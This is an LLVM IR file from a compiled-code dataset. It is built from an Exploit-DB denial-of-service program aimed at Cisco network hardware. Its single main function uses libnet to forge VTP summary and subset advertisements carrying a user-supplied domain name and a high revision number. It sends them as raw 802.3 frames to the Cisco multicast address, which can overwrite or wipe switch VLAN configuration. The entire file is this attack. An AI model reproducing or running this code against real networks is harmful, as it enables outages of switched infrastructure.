; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_7776.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_7776.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.vtp_summary = type { i32, i32, i32, i32, i32*, i8* }
%struct.vtp_subset = type { i32, i32, i32, i32, i32*, i8* }
%struct.libnet_ether_addr = type { i32 }

@__const.main.cisco_data = private unnamed_addr constant [5 x i32] [i32 0, i32 0, i32 12, i32 32, i32 3], align 16
@__const.main.dst_mac = private unnamed_addr constant [6 x i32] [i32 1, i32 0, i32 12, i32 204, i32 204, i32 204], align 16
@__const.main.aaa = private unnamed_addr constant [8 x i32] [i32 34, i32 0, i32 17, i32 34, i32 17, i32 0, i32 0, i32 0], align 16
@LIBNET_ERRBUF_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"i:d:\00", align 1
@optarg = external dso_local global i8*, align 8
@.str.1 = private unnamed_addr constant [68 x i8] c"  %s -i <interface> -d <vtp domain>\0A     must assign the interface\0A\00", align 1
@LIBNET_LINK = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [17 x i8] c"libnet_init: %s\0A\00", align 1
@LIBNET_802_2_H = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.vtp_summary*, align 8
  %13 = alloca %struct.vtp_subset*, align 8
  %14 = alloca i32*, align 8
  %15 = alloca i32*, align 8
  %16 = alloca i32*, align 8
  %17 = alloca [5 x i32], align 16
  %18 = alloca [6 x i32], align 16
  %19 = alloca [8 x i32], align 16
  %20 = alloca %struct.libnet_ether_addr*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i64, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  store i32 0, i32* %10, align 4
  %26 = bitcast [5 x i32]* %17 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %26, i8* align 16 bitcast ([5 x i32]* @__const.main.cisco_data to i8*), i64 20, i1 false)
  %27 = bitcast [6 x i32]* %18 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %27, i8* align 16 bitcast ([6 x i32]* @__const.main.dst_mac to i8*), i64 24, i1 false)
  %28 = bitcast [8 x i32]* %19 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %28, i8* align 16 bitcast ([8 x i32]* @__const.main.aaa to i8*), i64 32, i1 false)
  %29 = load i32, i32* @LIBNET_ERRBUF_SIZE, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %22, align 8
  %32 = alloca i8, i64 %30, align 16
  store i64 %30, i64* %23, align 8
  br label %33

33:                                               ; preds = %59, %2
  %34 = load i32, i32* %4, align 4
  %35 = load i8**, i8*** %5, align 8
  %36 = call i32 @getopt(i32 %34, i8** %35, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  store i32 %36, i32* %6, align 4
  %37 = icmp ne i32 %36, -1
  br i1 %37, label %38, label %60

38:                                               ; preds = %33
  %39 = load i32, i32* %6, align 4
  switch i32 %39, label %54 [
    i32 105, label %40
    i32 100, label %47
  ]

40:                                               ; preds = %38
  %41 = load i8*, i8** @optarg, align 8
  %42 = call i32 @strlen(i8* %41)
  %43 = call i8* @malloc(i32 %42)
  store i8* %43, i8** %21, align 8
  %44 = load i8*, i8** %21, align 8
  %45 = load i8*, i8** @optarg, align 8
  %46 = call i32 @strcpy(i8* %44, i8* %45)
  store i32 1, i32* %7, align 4
  br label %59

47:                                               ; preds = %38
  %48 = load i8*, i8** @optarg, align 8
  %49 = call i32 @strlen(i8* %48)
  %50 = call i8* @malloc(i32 %49)
  store i8* %50, i8** %24, align 8
  %51 = load i8*, i8** %24, align 8
  %52 = load i8*, i8** @optarg, align 8
  %53 = call i32 @strcpy(i8* %51, i8* %52)
  br label %59

54:                                               ; preds = %38
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 0
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @usage(i8* %57)
  br label %59

59:                                               ; preds = %54, %47, %40
  br label %33

60:                                               ; preds = %33
  %61 = load i32, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %69, label %63

63:                                               ; preds = %60
  %64 = load i8**, i8*** %5, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 0
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.1, i64 0, i64 0), i8* %66)
  %68 = call i32 @exit(i32 1) #5
  unreachable

69:                                               ; preds = %60
  %70 = load i32, i32* @LIBNET_LINK, align 4
  %71 = load i8*, i8** %21, align 8
  %72 = call i32* @libnet_init(i32 %70, i8* %71, i8* %32)
  store i32* %72, i32** %9, align 8
  %73 = load i32*, i32** %9, align 8
  %74 = icmp ne i32* %73, null
  br i1 %74, label %78, label %75

75:                                               ; preds = %69
  %76 = load i32, i32* @stderr, align 4
  %77 = call i32 @fprintf(i32 %76, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0), i8* %32)
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %25, align 4
  br label %193

78:                                               ; preds = %69
  %79 = load i32*, i32** %9, align 8
  %80 = call %struct.libnet_ether_addr* @libnet_get_hwaddr(i32* %79)
  store %struct.libnet_ether_addr* %80, %struct.libnet_ether_addr** %20, align 8
  store i32 52, i32* %10, align 4
  %81 = load i32, i32* %10, align 4
  %82 = call i32* @calloc(i32 1, i32 %81)
  store i32* %82, i32** %14, align 8
  %83 = load i32*, i32** %14, align 8
  store i32* %83, i32** %16, align 8
  %84 = load i32*, i32** %14, align 8
  %85 = getelementptr inbounds [5 x i32], [5 x i32]* %17, i64 0, i64 0
  %86 = call i32 (i32*, ...) @memcpy(i32* %84, i32* %85, i64 20)
  %87 = load i32*, i32** %16, align 8
  %88 = getelementptr inbounds i32, i32* %87, i64 20
  store i32* %88, i32** %16, align 8
  %89 = load i32*, i32** %16, align 8
  %90 = bitcast i32* %89 to %struct.vtp_summary*
  store %struct.vtp_summary* %90, %struct.vtp_summary** %12, align 8
  %91 = load %struct.vtp_summary*, %struct.vtp_summary** %12, align 8
  %92 = getelementptr inbounds %struct.vtp_summary, %struct.vtp_summary* %91, i32 0, i32 0
  store i32 1, i32* %92, align 8
  %93 = load %struct.vtp_summary*, %struct.vtp_summary** %12, align 8
  %94 = getelementptr inbounds %struct.vtp_summary, %struct.vtp_summary* %93, i32 0, i32 1
  store i32 1, i32* %94, align 4
  %95 = load %struct.vtp_summary*, %struct.vtp_summary** %12, align 8
  %96 = getelementptr inbounds %struct.vtp_summary, %struct.vtp_summary* %95, i32 0, i32 2
  store i32 1, i32* %96, align 8
  %97 = load i8*, i8** %24, align 8
  %98 = call i32 @strlen(i8* %97)
  %99 = load %struct.vtp_summary*, %struct.vtp_summary** %12, align 8
  %100 = getelementptr inbounds %struct.vtp_summary, %struct.vtp_summary* %99, i32 0, i32 3
  store i32 %98, i32* %100, align 4
  %101 = load %struct.vtp_summary*, %struct.vtp_summary** %12, align 8
  %102 = getelementptr inbounds %struct.vtp_summary, %struct.vtp_summary* %101, i32 0, i32 4
  %103 = load i32*, i32** %102, align 8
  %104 = load i8*, i8** %24, align 8
  %105 = load i8*, i8** %24, align 8
  %106 = call i32 @strlen(i8* %105)
  %107 = call i32 (i32*, ...) @memcpy(i32* %103, i8* %104, i32 %106)
  %108 = call i8* @htonl(i32 2000)
  %109 = load %struct.vtp_summary*, %struct.vtp_summary** %12, align 8
  %110 = getelementptr inbounds %struct.vtp_summary, %struct.vtp_summary* %109, i32 0, i32 5
  store i8* %108, i8** %110, align 8
  %111 = load i32*, i32** %14, align 8
  %112 = load i32, i32* %10, align 4
  %113 = load i32*, i32** %9, align 8
  %114 = call i32 @libnet_build_802_2(i32 170, i32 170, i32 3, i32* %111, i32 %112, i32* %113, i32 0)
  store i32 %114, i32* %8, align 4
  %115 = getelementptr inbounds [6 x i32], [6 x i32]* %18, i64 0, i64 0
  %116 = load %struct.libnet_ether_addr*, %struct.libnet_ether_addr** %20, align 8
  %117 = getelementptr inbounds %struct.libnet_ether_addr, %struct.libnet_ether_addr* %116, i32 0, i32 0
  %118 = load i32, i32* %117, align 4
  %119 = load i64, i64* @LIBNET_802_2_H, align 8
  %120 = load i32, i32* %10, align 4
  %121 = sext i32 %120 to i64
  %122 = add nsw i64 %119, %121
  %123 = load i32*, i32** %9, align 8
  %124 = call i32 @libnet_build_802_3(i32* %115, i32 %118, i64 %122, i32* null, i32 0, i32* %123, i32 0)
  store i32 %124, i32* %8, align 4
  %125 = load i32*, i32** %9, align 8
  %126 = call i32 @libnet_write(i32* %125)
  store i32 %126, i32* %11, align 4
  %127 = load i32, i32* %11, align 4
  %128 = icmp eq i32 %127, -1
  br i1 %128, label %129, label %134

129:                                              ; preds = %78
  %130 = load i32*, i32** %9, align 8
  %131 = call i32 @libnet_clear_packet(i32* %130)
  %132 = load i32*, i32** %14, align 8
  %133 = call i32 @free(i32* %132)
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %25, align 4
  br label %193

134:                                              ; preds = %78
  %135 = load i32*, i32** %9, align 8
  %136 = call i32 @libnet_clear_packet(i32* %135)
  store i32 52, i32* %10, align 4
  %137 = load i32, i32* %10, align 4
  %138 = call i32* @calloc(i32 1, i32 %137)
  store i32* %138, i32** %15, align 8
  %139 = load i32*, i32** %15, align 8
  store i32* %139, i32** %16, align 8
  %140 = load i32*, i32** %15, align 8
  %141 = getelementptr inbounds [5 x i32], [5 x i32]* %17, i64 0, i64 0
  %142 = call i32 (i32*, ...) @memcpy(i32* %140, i32* %141, i64 20)
  %143 = load i32*, i32** %16, align 8
  %144 = getelementptr inbounds i32, i32* %143, i64 20
  store i32* %144, i32** %16, align 8
  %145 = load i32*, i32** %16, align 8
  %146 = bitcast i32* %145 to %struct.vtp_subset*
  store %struct.vtp_subset* %146, %struct.vtp_subset** %13, align 8
  %147 = load %struct.vtp_subset*, %struct.vtp_subset** %13, align 8
  %148 = getelementptr inbounds %struct.vtp_subset, %struct.vtp_subset* %147, i32 0, i32 0
  store i32 1, i32* %148, align 8
  %149 = load %struct.vtp_subset*, %struct.vtp_subset** %13, align 8
  %150 = getelementptr inbounds %struct.vtp_subset, %struct.vtp_subset* %149, i32 0, i32 1
  store i32 2, i32* %150, align 4
  %151 = load %struct.vtp_subset*, %struct.vtp_subset** %13, align 8
  %152 = getelementptr inbounds %struct.vtp_subset, %struct.vtp_subset* %151, i32 0, i32 2
  store i32 1, i32* %152, align 8
  %153 = load i8*, i8** %24, align 8
  %154 = call i32 @strlen(i8* %153)
  %155 = load %struct.vtp_subset*, %struct.vtp_subset** %13, align 8
  %156 = getelementptr inbounds %struct.vtp_subset, %struct.vtp_subset* %155, i32 0, i32 3
  store i32 %154, i32* %156, align 4
  %157 = load %struct.vtp_subset*, %struct.vtp_subset** %13, align 8
  %158 = getelementptr inbounds %struct.vtp_subset, %struct.vtp_subset* %157, i32 0, i32 4
  %159 = load i32*, i32** %158, align 8
  %160 = load i8*, i8** %24, align 8
  %161 = load i8*, i8** %24, align 8
  %162 = call i32 @strlen(i8* %161)
  %163 = call i32 (i32*, ...) @memcpy(i32* %159, i8* %160, i32 %162)
  %164 = call i8* @htonl(i32 2000)
  %165 = load %struct.vtp_subset*, %struct.vtp_subset** %13, align 8
  %166 = getelementptr inbounds %struct.vtp_subset, %struct.vtp_subset* %165, i32 0, i32 5
  store i8* %164, i8** %166, align 8
  %167 = load i32*, i32** %15, align 8
  %168 = load i32, i32* %10, align 4
  %169 = load i32*, i32** %9, align 8
  %170 = call i32 @libnet_build_802_2(i32 170, i32 170, i32 3, i32* %167, i32 %168, i32* %169, i32 0)
  store i32 %170, i32* %8, align 4
  %171 = getelementptr inbounds [6 x i32], [6 x i32]* %18, i64 0, i64 0
  %172 = load %struct.libnet_ether_addr*, %struct.libnet_ether_addr** %20, align 8
  %173 = getelementptr inbounds %struct.libnet_ether_addr, %struct.libnet_ether_addr* %172, i32 0, i32 0
  %174 = load i32, i32* %173, align 4
  %175 = load i64, i64* @LIBNET_802_2_H, align 8
  %176 = load i32, i32* %10, align 4
  %177 = sext i32 %176 to i64
  %178 = add nsw i64 %175, %177
  %179 = load i32*, i32** %9, align 8
  %180 = call i32 @libnet_build_802_3(i32* %171, i32 %174, i64 %178, i32* null, i32 0, i32* %179, i32 0)
  store i32 %180, i32* %8, align 4
  %181 = load i32*, i32** %9, align 8
  %182 = call i32 @libnet_write(i32* %181)
  store i32 %182, i32* %11, align 4
  %183 = load i32, i32* %11, align 4
  %184 = icmp eq i32 %183, -1
  br i1 %184, label %185, label %190

185:                                              ; preds = %134
  %186 = load i32*, i32** %9, align 8
  %187 = call i32 @libnet_clear_packet(i32* %186)
  %188 = load i32*, i32** %14, align 8
  %189 = call i32 @free(i32* %188)
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %25, align 4
  br label %193

190:                                              ; preds = %134
  %191 = load i32*, i32** %9, align 8
  %192 = call i32 @libnet_clear_packet(i32* %191)
  store i32 0, i32* %25, align 4
  br label %193

193:                                              ; preds = %190, %185, %129, %75
  %194 = load i8*, i8** %22, align 8
  call void @llvm.stackrestore(i8* %194)
  %195 = load i32, i32* %25, align 4
  switch i32 %195, label %198 [
    i32 0, label %196
    i32 1, label %196
  ]

196:                                              ; preds = %193, %193
  %197 = load i32, i32* %3, align 4
  ret i32 %197

198:                                              ; preds = %193
  unreachable
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @getopt(i32, i8**, i8*) #3

declare dso_local i8* @malloc(i32) #3

declare dso_local i32 @strlen(i8*) #3

declare dso_local i32 @strcpy(i8*, i8*) #3

declare dso_local i32 @usage(i8*) #3

declare dso_local i32 @printf(i8*, i8*) #3

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #4

declare dso_local i32* @libnet_init(i32, i8*, i8*) #3

declare dso_local i32 @fprintf(i32, i8*, i8*) #3

declare dso_local %struct.libnet_ether_addr* @libnet_get_hwaddr(i32*) #3

declare dso_local i32* @calloc(i32, i32) #3

declare dso_local i32 @memcpy(i32*, ...) #3

declare dso_local i8* @htonl(i32) #3

declare dso_local i32 @libnet_build_802_2(i32, i32, i32, i32*, i32, i32*, i32) #3

declare dso_local i32 @libnet_build_802_3(i32*, i32, i64, i32*, i32, i32*, i32) #3

declare dso_local i32 @libnet_write(i32*) #3

declare dso_local i32 @libnet_clear_packet(i32*) #3

declare dso_local i32 @free(i32*) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
